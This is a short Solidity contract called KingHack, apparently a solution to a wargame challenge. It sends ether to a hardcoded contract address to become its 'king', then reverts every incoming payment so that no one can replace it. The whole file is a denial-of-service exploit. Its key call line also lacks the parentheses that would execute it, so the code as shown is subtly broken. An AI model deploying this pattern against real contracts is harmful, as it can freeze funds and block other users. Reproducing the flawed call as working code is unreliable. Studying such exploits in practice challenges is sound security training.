pragma solidity ^0.6.0;

contract KingHack {

    address kingAddr; 
    
    constructor() payable public{
        kingAddr = 0x382eE57642D74f61A0b99AaCDe1a84b3b6616985;
    }

    function getKing() public {
        address(kingAddr).call{value: 1000000000000000000, gas: 400000};
    }

    receive() external payable{
        revert("forcing revert"); 
    }
    

}